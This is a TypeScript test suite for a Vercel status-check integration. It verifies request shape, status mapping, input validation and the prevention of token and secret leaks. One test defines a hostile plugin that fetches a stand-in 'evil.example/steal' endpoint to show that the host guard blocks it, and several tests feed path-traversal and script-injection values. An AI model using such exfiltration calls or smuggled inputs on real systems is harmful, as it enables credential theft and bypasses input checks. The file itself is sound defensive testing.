import type { Check, CheckResult, IntegrationContext, Logger } from '@switchyard/plugin-sdk'
import type { FastifyInstance } from 'fastify'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { createReadJson, runConnectionChecks } from '../src/checks/run-connection.js'
import { splitCredentials } from '../src/connections/credentials.js'
import { createSecretBox } from '../src/crypto/secrets.js'
import { createDefaultRegistry } from '../src/integrations/registry.js'
import { createVercelIntegration, vercelIntegration } from '../src/integrations/vercel.js'
import type { RunnableConnection } from '../src/store/types.js'
import { USER_ID, makeSigner, testConfig, type Signer } from './helpers.js'
import { bearer, routesApp } from './support/routes.js'

const TOKEN = 'vcp_SUPER_SECRET_token_123'
const PLAINTEXT = 'PLAINTEXT_SECRET_VALUE'
const NOW = Date.parse('2026-05-05T10:00:00.000Z')
const MIN = 60_000
const API = 'https://api.vercel.com'

const integration = createVercelIntegration({ now: () => NOW })
const checkOf = (id: string): Check => integration.checks.find((c) => c.id === id)!
const deployCheck = checkOf('production-deployment')
const envCheck = checkOf('env-preview-only')

interface Call {
  url: string
  init: RequestInit | undefined
}

type Responder = (url: string) => Response | Promise<Response>

const json = (body: unknown, status = 200, headers: Record<string, string> = {}) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { 'content-type': 'application/json', ...headers },
  })

function harness(
  responder: Responder | Response | unknown,
  creds: Record<string, string | undefined> = { token: TOKEN, projectId: 'my-app' },
) {
  const calls: Call[] = []
  const logs: { level: string; message: string; meta?: Record<string, unknown> }[] = []
  const rec =
    (level: string) =>
    (message: string, meta?: Record<string, unknown>): void => {
      logs.push({ level, message, meta })
    }
  const logger: Logger = {
    debug: rec('debug'),
    info: rec('info'),
    warn: rec('warn'),
    error: rec('error'),
  }
  const fetchFn = vi.fn(async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input)
    calls.push({ url, init })
    if (typeof responder === 'function') return (responder as Responder)(url)
    if (responder instanceof Response) return responder
    return json(responder)
  })
  const clean = Object.fromEntries(
    Object.entries(creds).filter(([, v]) => v !== undefined),
  ) as Record<string, string>
  const controller = new AbortController()
  const ctx: IntegrationContext = {
    credentials: Object.freeze(clean),
    fetch: fetchFn as unknown as typeof fetch,
    logger,
    signal: controller.signal,
    readJson: createReadJson(),
  }
  return { ctx, calls, logs, fetchFn, controller }
}

const dump = (...parts: unknown[]) => JSON.stringify(parts)

function expectNoLeak(result: CheckResult, logs: unknown) {
  const all = dump(result, logs)
  expect(all).not.toContain(TOKEN)
  expect(all).not.toContain(PLAINTEXT)
}

const deployment = (over: Record<string, unknown> = {}) => ({
  uid: 'dpl_abc123',
  readyState: 'READY',
  state: 'READY',
  created: NOW - 5 * MIN,
  url: 'secret-preview-url.vercel.app',
  target: 'production',
  ...over,
})
const deployments = (...items: Record<string, unknown>[]) => ({ deployments: items })

describe('vercel: request shape', () => {
  it('production-deployment calls the exact deployments URL with bearer token', async () => {
    const h = harness(deployments(deployment()))
    await deployCheck.run(h.ctx)
    expect(h.calls).toHaveLength(1)
    expect(h.calls[0]!.url).toBe(`${API}/v7/deployments?projectId=my-app&target=production&limit=1`)
    const init = h.calls[0]!.init!
    expect((init.headers as Record<string, string>).authorization).toBe(`Bearer ${TOKEN}`)
    expect(init.method ?? 'GET').toBe('GET')
    expect(init.signal).toBe(h.ctx.signal)
  })

  it('production-deployment appends teamId only when set', async () => {
    const h = harness(deployments(deployment()), {
      token: TOKEN,
      projectId: 'my-app',
      teamId: 'team_Abc1',
    })
    await deployCheck.run(h.ctx)
    expect(h.calls[0]!.url).toBe(
      `${API}/v7/deployments?projectId=my-app&target=production&limit=1&teamId=team_Abc1`,
    )
  })

  it('treats an empty teamId as unset', async () => {
    const h = harness(deployments(deployment()), { token: TOKEN, projectId: 'p', teamId: '' })
    const res = await deployCheck.run(h.ctx)
    expect(res.status).toBe('ok')
    expect(h.calls[0]!.url).not.toContain('teamId')
  })

  it('env-preview-only calls the exact env URL with an encoded project name', async () => {
    const h = harness({ envs: [] }, { token: TOKEN, projectId: 'my.app_1' })
    await envCheck.run(h.ctx)
    expect(h.calls).toHaveLength(1)
    expect(h.calls[0]!.url).toBe(`${API}/v10/projects/my.app_1/env?`)
    const init = h.calls[0]!.init!
    expect((init.headers as Record<string, string>).authorization).toBe(`Bearer ${TOKEN}`)
    expect(init.method ?? 'GET').toBe('GET')
    expect(init.signal).toBe(h.ctx.signal)
  })

  it('env-preview-only appends teamId when set', async () => {
    const h = harness({ envs: [] }, { token: TOKEN, projectId: 'p', teamId: 'team_1' })
    await envCheck.run(h.ctx)
    expect(h.calls[0]!.url).toBe(`${API}/v10/projects/p/env?teamId=team_1`)
  })

  it('declares only the Vercel host', () => {
    expect(vercelIntegration.allowedHosts).toEqual(['api.vercel.com'])
    expect(vercelIntegration.id).toBe('vercel')
    expect(vercelIntegration.checks.map((c) => c.id)).toEqual([
      'production-deployment',
      'env-preview-only',
    ])
  })
})

describe('vercel: production-deployment', () => {
  const run = async (dep: Record<string, unknown>) => {
    const h = harness(deployments(dep))
    const res = await deployCheck.run(h.ctx)
    expectNoLeak(res, h.logs)
    return res
  }

  it('READY is ok with details', async () => {
    const res = await run(deployment())
    expect(res.status).toBe('ok')
    expect(res.checkId).toBe('production-deployment')
    expect(res.details).toEqual({
      deploymentId: 'dpl_abc123',
      state: 'READY',
      createdAt: new Date(NOW - 5 * MIN).toISOString(),
    })
  })

  it('never exposes the deployment url', async () => {
    const res = await run(deployment())
    expect(dump(res)).not.toContain('secret-preview-url')
  })

  it('ERROR is error and exposes a well-formed errorCode only', async () => {
    const res = await run(
      deployment({
        readyState: 'ERROR',
        errorCode: 'BUILD_FAILED',
        errorMessage: 'LEAKY_ERROR_MESSAGE',
      }),
    )
    expect(res.status).toBe('error')
    expect(res.details).toMatchObject({ errorCode: 'BUILD_FAILED', state: 'ERROR' })
    expect(dump(res)).not.toContain('LEAKY_ERROR_MESSAGE')
  })

  it.each(['build failed!', 'lower_case', '', 'A'.repeat(65), 'X Y'])(
    'ERROR drops a malformed errorCode %j',
    async (errorCode) => {
      const res = await run(deployment({ readyState: 'ERROR', errorCode }))
      expect(res.status).toBe('error')
      expect(res.details).not.toHaveProperty('errorCode')
    },
  )

  it('ERROR without errorCode has no errorCode', async () => {
    const res = await run(deployment({ readyState: 'ERROR', errorCode: null }))
    expect(res.details).not.toHaveProperty('errorCode')
  })

  it('CANCELED is a warning', async () => {
    expect((await run(deployment({ readyState: 'CANCELED' }))).status).toBe('warning')
  })

  it.each(['BUILDING', 'QUEUED', 'INITIALIZING'])('%s fresh is ok', async (readyState) => {
    expect((await run(deployment({ readyState, created: NOW - 29 * MIN }))).status).toBe('ok')
  })

  it.each(['BUILDING', 'QUEUED', 'INITIALIZING'])('%s stale is a warning', async (readyState) => {
    expect((await run(deployment({ readyState, created: NOW - 31 * MIN }))).status).toBe('warning')
  })

  it('a build exactly 30 minutes old is stale', async () => {
    expect(
      (await run(deployment({ readyState: 'BUILDING', created: NOW - 30 * MIN }))).status,
    ).toBe('warning')
  })

  it('a building deployment without created is a warning', async () => {
    const d = deployment({ readyState: 'BUILDING' })
    delete (d as Record<string, unknown>).created
    const res = await run(d)
    expect(res.status).toBe('warning')
    expect(res.details).not.toHaveProperty('createdAt')
  })

  it.each(['BLOCKED', 'DELETED', 'WEIRD_STATE'])('%s is a warning', async (readyState) => {
    const res = await run(deployment({ readyState }))
    expect(res.status).toBe('warning')
    expect(res.details).toMatchObject({ state: readyState })
  })

  it('omits an unsanitary state from details', async () => {
    const res = await run(deployment({ readyState: 'evil <script>' }))
    expect(res.status).toBe('warning')
    expect(res.details).not.toHaveProperty('state')
    expect(dump(res)).not.toContain('evil')
  })

  it('empty deployment list is a warning', async () => {
    const h = harness(deployments())
    const res = await deployCheck.run(h.ctx)
    expect(res.status).toBe('warning')
    expect(res.details).toBeUndefined()
  })

  it.each(['abc', 'dpl_', 'dpl_a b', 'dpl_' + 'a'.repeat(65), 'DPL_abc'])(
    'drops deploymentId %j',
    async (uid) => {
      const res = await run(deployment({ uid }))
      expect(res.details).not.toHaveProperty('deploymentId')
    },
  )

  it('prefers readyState over state', async () => {
    const res = await run(deployment({ readyState: 'READY', state: 'ERROR' }))
    expect(res.status).toBe('ok')
  })

  it('falls back to state when readyState is missing', async () => {
    const d = deployment({ state: 'ERROR' })
    delete (d as Record<string, unknown>).readyState
    expect((await run(d)).status).toBe('error')
  })

  it('a missing state is a warning', async () => {
    const d = deployment()
    delete (d as Record<string, unknown>).readyState
    delete (d as Record<string, unknown>).state
    expect((await run(d)).status).toBe('warning')
  })
})

describe.each([
  ['production-deployment', deployCheck, deployments(deployment())],
  ['env-preview-only', envCheck, { envs: [] }],
])('vercel: HTTP mapping for %s', (_name, check, okBody) => {
  const go = async (responder: Responder | Response | unknown) => {
    const h = harness(responder)
    const res = await check.run(h.ctx)
    expectNoLeak(res, h.logs)
    return { res, h }
  }

  it('200 with a valid body succeeds', async () => {
    expect((await go(okBody)).res.status).not.toBe('unknown')
  })

  it.each([401, 403])('%i is an error', async (status) => {
    const { res, h } = await go(json({ error: { message: TOKEN } }, status))
    expect(res.status).toBe('error')
    expect(res.details).toEqual({ httpStatus: status })
    expect(h.logs.some((l) => l.level === 'warn')).toBe(true)
  })

  it('404 is an error', async () => {
    const { res } = await go(json({}, 404))
    expect(res.status).toBe('error')
    expect(res.details).toEqual({ httpStatus: 404 })
  })

  it('429 is unknown', async () => {
    const { res } = await go(json({}, 429))
    expect(res.status).toBe('unknown')
    expect(res.details).toEqual({ httpStatus: 429 })
  })

  it.each([500, 502])('%i is unknown with httpStatus', async (status) => {
    const { res } = await go(json({}, status))
    expect(res.status).toBe('unknown')
    expect(res.details).toEqual({ httpStatus: status })
  })

  it('a thrown fetch is unknown and does not leak the error', async () => {
    const h = harness(() => {
      throw new Error(`network down ${TOKEN}`)
    })
    const res = await check.run(h.ctx)
    expect(res.status).toBe('unknown')
    expectNoLeak(res, h.logs)
  })

  it('an aborted fetch is unknown', async () => {
    const h = harness(() => {
      throw new DOMException('aborted', 'AbortError')
    })
    h.controller.abort()
    expect((await check.run(h.ctx)).status).toBe('unknown')
  })

  it('invalid JSON is unknown', async () => {
    const { res } = await go(new Response('<html>nope', { status: 200 }))
    expect(res.status).toBe('unknown')
  })

  it.each([null, 'str', 42, [], { unrelated: true }])(
    'schema mismatch %j is unknown',
    async (body) => {
      // the env check legitimately accepts an object with a "key" (single env), so avoid it here
      const { res } = await go(json(body))
      expect(res.status).toBe('unknown')
    },
  )

  it('content-length above 2 MB is unknown', async () => {
    const r = json(okBody, 200, { 'content-length': String(2 * 1024 * 1024 + 1) })
    const { res } = await go(r)
    expect(res.status).toBe('unknown')
  })

  it('a body above 2 MB without content-length is unknown', async () => {
    const big = new Response(' '.repeat(2 * 1024 * 1024 + 1) + JSON.stringify(okBody), {
      status: 200,
    })
    big.headers.delete('content-length')
    const { res } = await go(big)
    expect(res.status).toBe('unknown')
  })
})

describe.each([
  ['production-deployment', deployCheck],
  ['env-preview-only', envCheck],
])('vercel: configuration for %s', (_name, check) => {
  const bad = async (creds: Record<string, string | undefined>) => {
    const h = harness({}, creds)
    const res = await check.run(h.ctx)
    expect(res.status).toBe('unknown')
    expect(res.message).toBe('Configuration invalide.')
    expect(h.fetchFn).not.toHaveBeenCalled()
    expectNoLeak(res, h.logs)
  }

  it.each(['../x', 'a/b', '', 'a'.repeat(101), '-start', 'a b', 'a?b=1', 'a#b', 'a%2Fb'])(
    'rejects projectId %j without calling fetch',
    (projectId) => bad({ token: TOKEN, projectId }),
  )

  it('rejects a missing projectId', () => bad({ token: TOKEN }))

  it.each(['t/x', 'a&b=c', '-x', 'a'.repeat(101), 'a.b', 'a b'])(
    'rejects teamId %j without calling fetch',
    (teamId) => bad({ token: TOKEN, projectId: 'p', teamId }),
  )

  it('rejects a missing token', () => bad({ projectId: 'p' }))
  it('rejects an empty token', () => bad({ token: '', projectId: 'p' }))

  it('accepts a 100-char projectId', async () => {
    const h = harness({ deployments: [], envs: [] }, { token: TOKEN, projectId: 'a'.repeat(100) })
    const res = await check.run(h.ctx)
    expect(res.message).not.toBe('Configuration invalide.')
    expect(h.fetchFn).toHaveBeenCalledOnce()
  })
})

describe('vercel: env-preview-only', () => {
  const env = (key: string, target: string | string[], extra: Record<string, unknown> = {}) => ({
    key,
    value: PLAINTEXT,
    type: 'plain',
    target,
    ...extra,
  })
  const go = async (body: unknown) => {
    const h = harness(body)
    const res = await envCheck.run(h.ctx)
    expectNoLeak(res, h.logs)
    return res
  }

  it('is ok when every preview key also exists in production', async () => {
    const res = await go({
      envs: [env('A', ['preview', 'production']), env('B', ['preview']), env('B', ['production'])],
      pagination: { count: 3, next: null },
    })
    expect(res.status).toBe('ok')
    expect(res.checkId).toBe('env-preview-only')
    expect(res.details).toBeUndefined()
  })

  it('is ok with no envs at all', async () => {
    expect((await go({ envs: [] })).status).toBe('ok')
  })

  it('accepts the { envs, hiddenProductionEnvCount } shape', async () => {
    const res = await go({ envs: [env('ONLY_PREVIEW', ['preview'])], hiddenProductionEnvCount: 3 })
    expect(res.status).toBe('warning')
    expect(res.details).toEqual({ missing: ['ONLY_PREVIEW'], total: 1 })
  })

  it('accepts a single env object', async () => {
    const res = await go(env('SOLO', ['preview']))
    expect(res.status).toBe('warning')
    expect(res.details).toEqual({ missing: ['SOLO'], total: 1 })
  })

  it('a single env object also in production is ok', async () => {
    expect((await go(env('SOLO', ['preview', 'production']))).status).toBe('ok')
  })

  it('accepts a string target', async () => {
    const res = await go({ envs: [env('S', 'preview'), env('P', 'production')] })
    expect(res.details).toEqual({ missing: ['S'], total: 1 })
  })

  it('a string production target excludes the key', async () => {
    const res = await go({ envs: [env('K', ['preview']), env('K', 'production')] })
    expect(res.status).toBe('ok')
  })

  it('reports keys sorted and deduplicated', async () => {
    const res = await go({
      envs: [
        env('ZED', ['preview']),
        env('ALPHA', ['preview']),
        env('ZED', ['preview']),
        env('MID', 'preview'),
      ],
    })
    expect(res.status).toBe('warning')
    expect(res.details).toEqual({ missing: ['ALPHA', 'MID', 'ZED'], total: 3 })
    expect(res.message).toContain('3 variable(s)')
  })

  it('excludes keys also present in production (other entry)', async () => {
    const res = await go({
      envs: [env('SHARED', ['preview']), env('SHARED', ['production']), env('ONLY', ['preview'])],
    })
    expect(res.details).toEqual({ missing: ['ONLY'], total: 1 })
  })

  it('ignores branch-specific preview variables', async () => {
    const res = await go({
      envs: [env('BRANCHY', ['preview'], { gitBranch: 'feature/x' }), env('P', ['production'])],
    })
    expect(res.status).toBe('ok')
  })

  it('ignores development-only variables', async () => {
    expect((await go({ envs: [env('DEV', ['development'])] })).status).toBe('ok')
  })

  it('tolerates entries with missing target and invalid entries', async () => {
    const res = await go({
      envs: [{ key: 'NOTARGET', value: PLAINTEXT }, 'garbage', null, env('X', ['preview'])],
    })
    expect(res.details).toEqual({ missing: ['X'], total: 1 })
  })

  it('lists at most 50 keys but reports the real total', async () => {
    const envs = Array.from({ length: 60 }, (_, i) =>
      env(`KEY_${String(i).padStart(3, '0')}`, ['preview']),
    )
    const res = await go({ envs })
    const details = res.details as { missing: string[]; total: number }
    expect(details.total).toBe(60)
    expect(details.missing).toHaveLength(50)
    expect(details.missing[0]).toBe('KEY_000')
    expect(details.missing[49]).toBe('KEY_049')
  })

  it('counts invalid-format keys without listing them', async () => {
    const res = await go({
      envs: [
        env('GOOD', ['preview']),
        env('bad key!', ['preview']),
        env('1STARTS_WITH_DIGIT', ['preview']),
        env('<script>', ['preview']),
      ],
    })
    expect(res.details).toEqual({ missing: ['GOOD'], total: 4 })
    expect(dump(res)).not.toContain('script')
  })

  it('a key longer than 256 chars is counted but not listed', async () => {
    const res = await go({ envs: [env('A'.repeat(257), ['preview'])] })
    expect(res.details).toEqual({ missing: [], total: 1 })
  })

  it('pagination.next marks a warning result partial', async () => {
    const res = await go({
      envs: [env('X', ['preview'])],
      pagination: { next: 1700000000000 },
    })
    expect(res.status).toBe('warning')
    expect(res.details).toEqual({ missing: ['X'], total: 1, partial: true })
    expect(res.message).toContain('partiel')
  })

  it('pagination.next marks an ok result partial', async () => {
    const res = await go({ envs: [env('X', ['preview', 'production'])], pagination: { next: 5 } })
    expect(res.status).toBe('ok')
    expect(res.details).toEqual({ partial: true })
    expect(res.message).toContain('partiel')
  })

  it('pagination.next null is not partial', async () => {
    const res = await go({ envs: [env('X', ['preview'])], pagination: { next: null } })
    expect(res.details).not.toHaveProperty('partial')
    expect(res.message).not.toContain('partiel')
  })

  it('never exposes the plaintext env value, even in a key', async () => {
    const res = await go({
      envs: [env('X', ['preview']), env('Y', ['preview', 'production'])],
    })
    expect(dump(res)).not.toContain(PLAINTEXT)
  })
})

describe('vercel: token never leaks', () => {
  it.each([
    ['production-deployment', deployCheck],
    ['env-preview-only', envCheck],
  ])('%s: error paths with a body echoing the token', async (_n, check) => {
    for (const status of [200, 401, 404, 429, 500]) {
      const h = harness(
        json(
          { deployments: [{ readyState: 'ERROR', errorCode: TOKEN, errorMessage: TOKEN }] },
          status,
        ),
      )
      const res = await check.run(h.ctx)
      expectNoLeak(res, h.logs)
    }
  })
})

describe('vercel: through runConnectionChecks', () => {
  const box = createSecretBox(testConfig().SWITCHYARD_ENCRYPTION_KEY)
  const CONN = '22222222-2222-4222-8222-222222222222'
  const real = createDefaultRegistry().get('vercel')!
  const now = new Date('2026-05-05T10:00:00.000Z')

  function conn(creds: Record<string, string> = { token: TOKEN, projectId: 'my-app' }) {
    const sealed = splitCredentials(box, real, creds, CONN, USER_ID)
    return {
      id: CONN,
      projectId: 'p',
      integrationId: 'vercel',
      config: sealed.config,
      secrets: sealed.secrets,
    } satisfies RunnableConnection
  }

  function runner(responder: Responder, creds?: Record<string, string>) {
    const calls: Call[] = []
    const logs: unknown[] = []
    const base = vi.fn(async (input: string | URL | Request, init?: RequestInit) => {
      calls.push({ url: String(input), init })
      return responder(String(input))
    })
    const logger: Logger = {
      debug: (m, meta) => logs.push([m, meta]),
      info: (m, meta) => logs.push([m, meta]),
      warn: (m, meta) => logs.push([m, meta]),
      error: (m, meta) => logs.push([m, meta]),
    }
    const outcome = runConnectionChecks({
      integration: real,
      connection: conn(creds),
      userId: USER_ID,
      box,
      fetch: base as unknown as typeof fetch,
      logger,
      now,
      timeoutMs: 2000,
    })
    return { outcome, calls, logs }
  }

  const route: Responder = (url) =>
    url.includes('/v7/deployments')
      ? json(deployments(deployment({ created: Date.now() })))
      : json({ envs: [{ key: 'ONLY_PREVIEW', value: PLAINTEXT, target: ['preview'] }] })

  it('runs both checks and returns their results', async () => {
    const { outcome, calls, logs } = runner(route)
    const { results, pending } = await outcome
    await pending
    expect(results.map((r) => [r.checkId, r.status])).toEqual([
      ['production-deployment', 'ok'],
      ['env-preview-only', 'warning'],
    ])
    expect(calls.map((c) => new URL(c.url).hostname)).toEqual(['api.vercel.com', 'api.vercel.com'])
    expect(JSON.stringify([results, logs])).not.toContain(TOKEN)
    expect(JSON.stringify([results, logs])).not.toContain(PLAINTEXT)
  })

  it('passes redirect: error and the bearer token to the underlying fetch', async () => {
    const { outcome, calls } = runner(route)
    await outcome
    for (const c of calls) {
      expect(c.init!.redirect).toBe('error')
      expect((c.init!.headers as Record<string, string>).authorization).toBe(`Bearer ${TOKEN}`)
      expect(c.init!.signal).toBeInstanceOf(AbortSignal)
    }
  })

  it('declares api.vercel.com as the only allowed host and default methods', () => {
    expect(real.allowedHosts).toEqual(['api.vercel.com'])
    expect(real.allowedMethods).toBeUndefined()
  })

  it('blocks a plugin call to another host through the guard', async () => {
    const evil: Integration2 = {
      ...real,
      checks: [
        {
          id: 'evil',
          title: 'evil',
          async run(ctx) {
            let blocked = false
            try {
              await ctx.fetch('https://evil.example/steal')
            } catch {
              blocked = true
            }
            return {
              checkId: 'evil',
              status: blocked ? 'ok' : 'error',
              message: 'm',
              checkedAt: now.toISOString(),
            }
          },
        },
      ],
    }
    const base = vi.fn(async () => json({}))
    const outcome = await runConnectionChecks({
      integration: evil,
      connection: conn(),
      userId: USER_ID,
      box,
      fetch: base as unknown as typeof fetch,
      logger: { debug() {}, info() {}, warn() {}, error() {} },
      now,
    })
    expect(outcome.results[0]!.status).toBe('ok')
    expect(base).not.toHaveBeenCalled()
  })

  it('redacts the token when the response echoes it in errorCode-like fields', async () => {
    const { outcome, logs } = runner(() =>
      json({
        deployments: [
          { uid: 'dpl_x', readyState: 'ERROR', errorCode: TOKEN, errorMessage: TOKEN, url: TOKEN },
        ],
        envs: [{ key: TOKEN, target: ['preview'], value: TOKEN }],
      }),
    )
    const { results } = await outcome
    expect(JSON.stringify([results, logs])).not.toContain(TOKEN)
    expect(results[0]!.status).toBe('error')
  })

  it('maps a redirect refusal (fetch rejection) to unknown results', async () => {
    const { outcome } = runner(() => {
      throw new TypeError('redirect mode is set to error')
    })
    const { results } = await outcome
    expect(results.map((r) => r.status)).toEqual(['unknown', 'unknown'])
  })

  it('runs with a minimal valid stored config (token and projectId only)', async () => {
    const { outcome, calls } = runner(route, { token: TOKEN, projectId: 'p' })
    const { results } = await outcome
    expect(results.every((r) => r.status === 'ok' || r.status === 'warning')).toBe(true)
    expect(calls).toHaveLength(2)
  })
})

type Integration2 = Parameters<typeof runConnectionChecks>[0]['integration']

describe('vercel: registration and credentials routes', () => {
  let signer: Signer
  let app: FastifyInstance
  let headers: { authorization: string }

  beforeAll(async () => {
    signer = await makeSigner()
    app = routesApp(signer).app
    headers = await bearer(signer, USER_ID)
  })
  afterAll(() => app.close())

  const project = async () =>
    (
      await app.inject({ method: 'POST', url: '/api/projects', headers, payload: { name: 'P' } })
    ).json().project.id as string
  const connect = async (credentials: Record<string, string>) =>
    app.inject({
      method: 'POST',
      url: `/api/projects/${await project()}/connections`,
      headers,
      payload: { integrationId: 'vercel', label: 'V', credentials },
    })

  it('lists vercel with its credential schema', async () => {
    const res = await app.inject({ method: 'GET', url: '/api/integrations', headers })
    const v = res.json().integrations.find((i: { id: string }) => i.id === 'vercel')
    expect(v.name).toBe('Vercel')
    const byKey = Object.fromEntries(
      v.credentialsSchema.map((f: { key: string }) => [f.key, f]),
    ) as Record<string, { secret: boolean; optional: boolean; pattern: string | null }>
    expect(byKey.token).toMatchObject({ secret: true, optional: false })
    expect(byKey.projectId).toMatchObject({ secret: false, optional: false })
    expect(byKey.projectId!.pattern).toEqual(expect.any(String))
    expect(byKey.teamId).toMatchObject({ secret: false, optional: true })
    expect(byKey.teamId!.pattern).toEqual(expect.any(String))
  })

  it('creates a connection with token and projectId only', async () => {
    const res = await connect({ token: TOKEN, projectId: 'my-app' })
    expect(res.statusCode).toBe(201)
    const { connection } = res.json()
    expect(connection.config).toEqual({ projectId: 'my-app' })
    expect(connection.secretFields).toEqual(['token'])
    expect(res.body).not.toContain(TOKEN)
  })

  it('stores teamId in config', async () => {
    const res = await connect({ token: TOKEN, projectId: 'my-app', teamId: 'team_abc' })
    expect(res.statusCode).toBe(201)
    expect(res.json().connection.config).toEqual({ projectId: 'my-app', teamId: 'team_abc' })
  })

  it.each(['../x', 'a/b', '', 'a b'])('rejects projectId %j with 400', async (projectId) => {
    const res = await connect({ token: TOKEN, projectId })
    expect(res.statusCode).toBe(400)
    expect(res.body).toContain('credentials.projectId')
    if (projectId) {
      expect(res.body).toContain('Format invalide.')
      expect(res.body).not.toContain(projectId)
    }
    expect(res.body).not.toContain(TOKEN)
  })

  it.each(['t/x', 'a.b', 'a b'])('rejects teamId %j with 400', async (teamId) => {
    const res = await connect({ token: TOKEN, projectId: 'p', teamId })
    expect(res.statusCode).toBe(400)
    expect(res.body).toContain('credentials.teamId')
    expect(res.body).toContain('Format invalide.')
    expect(res.body).not.toContain(teamId)
  })

  it('rejects a missing projectId with 400', async () => {
    const res = await connect({ token: TOKEN })
    expect(res.statusCode).toBe(400)
    expect(res.body).toContain('credentials.projectId')
    expect(res.body).not.toContain(TOKEN)
  })

  it('rejects a missing token with 400', async () => {
    const res = await connect({ projectId: 'p' })
    expect(res.statusCode).toBe(400)
  })
})
